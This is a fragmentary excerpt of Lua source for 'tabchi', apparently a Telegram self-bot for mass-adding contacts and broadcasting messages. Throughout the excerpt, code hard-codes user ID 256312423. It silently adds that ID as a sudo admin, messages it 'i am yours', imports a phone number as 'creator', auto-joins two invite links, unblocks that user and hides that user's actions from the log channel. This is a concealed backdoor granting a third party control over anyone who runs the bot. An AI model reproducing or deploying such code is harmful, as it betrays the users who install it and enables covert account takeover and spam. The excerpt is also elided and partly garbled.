 ...
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
  if not result.phone_number_ then
    ...
    tdcli.add_contact(phone_number, first_name, last_name, user_id)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:256312423", true)
    ...
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(matches[2], 0, 1, matches[3], 1, "md")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 256312423 and not msg.sender_user_id_ == 256312423 then
  ...
  if msg.text:match("^[#!/]leave(-%d+)") and is_sudo(msg) then
  	local txt = {string.match(msg.text, "^[#/!](leave)(-%d+)$")} 
	   ...
	   tdcli.chat_leave(txt[2], data.id_)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 9256312423 and not msg.sender_user_id_ == 256312423 then
...
local function getpro(extra, result, success)
 ...
 function contacts_list(extra, result)
  ...
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256312423) then
      tdcli.sendMessage(256312423, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989115177579, "creator", "", 256312423)
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256312423)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256312423) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256312423)
      tdcli.sendMessage(256312423, 0, 1, "i am yours", 1, "html")
  ...
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256312423) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEIPMf8LG-xzHQLPVg")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEG90VLornM2I-D8Xg")
    local text = [[
`#راهنما`
...
function update(data, tabchi_id)
  ...
  elseif data.chat_id_ == 256312423 then
      tdcli.unblockUser(256312423)	  
